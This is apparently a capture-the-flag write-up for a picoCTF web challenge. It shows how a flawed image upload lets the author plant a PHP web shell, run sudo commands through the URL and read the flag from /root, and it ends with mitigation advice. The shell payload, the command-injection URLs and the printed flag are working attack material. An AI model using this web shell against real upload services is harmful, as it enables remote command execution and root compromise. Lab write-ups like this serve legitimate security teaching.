# Challenge Title
n0s4n1ty 1

---

## Description
A website is provided where users can upload images.                                                                                                                 
The implementation is Flawed.
Flag is located in the `/root` directory.

---

## Steps to Solve

### 1. Upload a picture.
- Noticed the URL has changes to `/upload.php`
- This shows that the php script confirms the uploaded file and provides the above path.

### 2. Craft a php payload.
```php
?php system($_GET['mycommand']); ?>
```
- Named the file as `Payload.php`
- The `php` tag is essential and must wrap the payload for PHP to interpret it correctly.
- The `system()` function directly runs commands on the server.
- `$_GET['mycommand']` allows us to pass a command through the URL and run it via `system()`.
                                                                                   

### 3. Upload the payload.
- **Output:**
```
The file Payload.php has been uploaded Path: uploads/Payload.php
```
- This specifies the path to access our uploaded web shell.

### 4. Modify the URL to access the Payload.php file.

- URL:
```
/uploads/Payload.php?mycommand=sudo%20-l
```
- Appended the specified path `uploads/Payload.php` with `?mycommand=sudo%20-l`.
- The hint mentioned `sudo -`, so I tested `sudo -l` to see what privileges the web server user (`www-data`) had.
- It revealed that `www-data` had full `sudo` access with no password this gave root access instantly.
- **output:**
```
 User www-data may run the following commands on challenge: (ALL) NOPASSWD: ALL.
```

### 5. See what files are available under `/root`
- URL
``` 
uploads/Payload.php?mycommand=sudo ls /root
```
- **Output:** 
```
flag.txt
```

### 6. cat the contents in the flag.
- URL:
```
uploads/Payload.php?mycommand=sudo cat /root/flag.txt
```
- **Output:**
``` 
picoCTF{wh47_c4n_u_d0_wPHP_80eedb7d}
```

---     

## Flag
```
picoCTF{wh47_c4n_u_d0_wPHP_80eedb7d}
```
---

## Notes
- Sanitizing input is essential.
- Never allow user input to be passed directly into system commands.
- Avoid executing uploaded files as scripts.
---

## Mitigation
- Only allow the user to upload expected file types (e.g., `.jpg`, `.png`, `.pdf`).
- Place uploaded files in a non-executable directory.
- Never use functions like `system()`, `exec()`, or `shell_exec()` to execute user input unless that input has been carefully validated and sanitized to prevent abuse.
- Properly configure user permissions (e.g., avoid giving `www-data` `sudo` access).
